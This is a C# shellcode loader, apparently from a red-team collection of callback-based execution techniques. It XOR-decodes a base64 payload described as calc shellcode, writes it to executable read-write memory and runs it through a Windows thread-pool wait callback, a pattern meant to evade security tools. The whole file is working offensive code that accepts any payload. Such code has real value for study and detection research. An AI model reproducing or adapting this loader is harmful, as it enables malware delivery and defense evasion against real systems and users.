using System;
using System.Runtime.InteropServices;

namespace AltCallbacks
{
    class Callback
    {
        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThreadpoolWait(IntPtr pfnWaithandler, IntPtr pContext, IntPtr pcCallback);

        [DllImport("kernel32.dll")]
        private static extern void SetThreadpoolWait(IntPtr pwaithandle, IntPtr pft, uint dwWait);

        [DllImport("kernel32.dll")]
        private static extern void WaitForThreadpoolWaitCallbacks(IntPtr pwaithandle, bool bCancelPendingCallbacks);

        [DllImport("kernel32.dll")]
        private static extern bool SetEvent(IntPtr hEvent);

        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint dwMilliseconds);

        static string key = "THISISMYKEY";

        static void Main(string[] args)
        {
            // Calc shellcode
            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";

            byte[] decoded = Convert.FromBase64String(base64);
            byte[] shellcode = new byte[decoded.Length];

            for (int i = 0; i < decoded.Length; i++)
                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));

            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(shellcode, 0, p, shellcode.Length);

            IntPtr hEvent = CreateEvent(IntPtr.Zero, false, false, null);
            if (hEvent == IntPtr.Zero)
                System.Environment.Exit(0);

            // Callback function
            IntPtr wait = CreateThreadpoolWait(p, IntPtr.Zero, IntPtr.Zero);

            SetThreadpoolWait(wait, hEvent, 0);
            SetEvent(hEvent);
            WaitForThreadpoolWaitCallbacks(wait, false);
            SetEvent(hEvent);

            // Arbitrary sleep
            Sleep(10000);

            return;
        }
    }
}
